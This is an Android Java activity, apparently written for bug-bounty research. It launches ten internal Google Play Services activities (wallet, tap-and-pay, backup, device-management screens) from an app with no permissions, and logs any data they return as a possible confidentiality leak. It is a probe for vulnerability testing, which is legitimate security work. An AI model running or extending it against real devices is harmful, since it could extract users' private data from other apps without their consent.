package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class GmsResultStealActivity extends Activity {
    private static final String T = "GMS_RESULT_STEAL";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== GMS Result Steal Test ===");
        Log.w(T, "UID=" + android.os.Process.myUid());

        // Test activities that might return data via setResult
        String[][] targets = {
            {"com.google.android.gms", "com.google.android.gms.personalsafety.settings.autolock.AutoLockSettingsDialogActivity"},
            {"com.google.android.gms", "com.google.android.gms.mdm.MdmSettingsActivityPermissionTrampoline"},
            {"com.google.android.gms", "com.google.android.gms.location.ambientlocation.AmbientLocationTrampolineActivity"},
            {"com.google.android.gms", "com.google.android.gms.mdm.LockscreenActivityPermissionTrampoline"},
            {"com.google.android.gms", "com.google.android.gms.smartdevice.quickstart.ui.TargetFallbackActivity"},
            {"com.google.android.gms", "com.google.android.gms.backup.component.D2dSourceActivity"},
            {"com.google.android.gms", "com.google.android.gms.games.ui.upsell.InGameUiProxyActivity"},
            {"com.google.android.gms", "com.google.android.gms.tapandpay.ui.ShowSecurityPromptActivity"},
            {"com.google.android.gms", "com.google.android.gms.wallet.redirect.FinishAndroidAppRedirectProxyActivity"},
            {"com.google.android.gms", "com.google.android.gms.dtdi.features.devicelink.DeviceLinkWakeupActivity"},
        };

        for (int idx = 0; idx < targets.length; idx++) {
            try {
                Intent i = new Intent();
                i.setComponent(new ComponentName(targets[idx][0], targets[idx][1]));
                startActivityForResult(i, 100 + idx);
                Log.w(T, "[+] Launched " + targets[idx][1].substring(targets[idx][1].lastIndexOf('.') + 1) + " with requestCode=" + (100 + idx));
            } catch (Exception e) {
                Log.w(T, "[-] " + targets[idx][1].substring(targets[idx][1].lastIndexOf('.') + 1) + ": " + e.getMessage());
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.w(T, "[RESULT] requestCode=" + requestCode + " resultCode=" + resultCode);
        if (data != null) {
            Log.w(T, "[RESULT] action=" + data.getAction());
            Log.w(T, "[RESULT] data=" + data.getData());
            Log.w(T, "[RESULT] type=" + data.getType());
            if (data.getExtras() != null) {
                for (String key : data.getExtras().keySet()) {
                    Object val = data.getExtras().get(key);
                    Log.w(T, "[RESULT] extra: " + key + " = " + String.valueOf(val));
                }
            }
            Log.w(T, "[!!!] RECEIVED DATA FROM GMS ACTIVITY — POTENTIAL CONFIDENTIALITY VIOLATION");
        } else {
            Log.w(T, "[RESULT] data=null (no data returned)");
        }
    }
}
